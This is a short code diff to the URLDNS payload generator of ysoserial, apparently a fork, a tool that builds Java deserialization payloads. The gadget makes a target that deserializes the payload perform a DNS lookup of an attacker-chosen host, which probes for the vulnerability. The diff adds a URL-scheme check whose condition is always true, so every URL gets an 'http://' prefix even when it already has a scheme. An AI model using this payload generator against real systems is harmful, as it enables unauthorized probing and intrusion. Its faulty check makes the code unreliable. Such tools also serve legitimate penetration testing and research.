@@ -49,7 +49,7 @@ import ysoserial.payloads.util.Reflections;
 @DynamicCommands({DynamicCommands.DNS})
 public class URLDNS implements ObjectPayload<Object> {
 
-        public Object getObject(final String url, final String attackType) throws Exception {
+        public Object getObject(String url, final String attackType) throws Exception {
     		if(!attackType.equals("exec_global")) {
     	    	
     	    	System.out.println("**********************************");
@@ -62,7 +62,9 @@ public class URLDNS implements ObjectPayload<Object> {
                 //Avoid DNS resolution during payload creation
                 //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                 URLStreamHandler handler = new SilentURLStreamHandler();
-
+                if(!url.startsWith("http://") || !url.startsWith("https://")) {
+                        url = "http://" + url;
+                }
                 HashMap ht = new HashMap(); // HashMap that will contain the URL
                 URL u = new URL(null, url, handler); // URL to use as the Key
                 ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
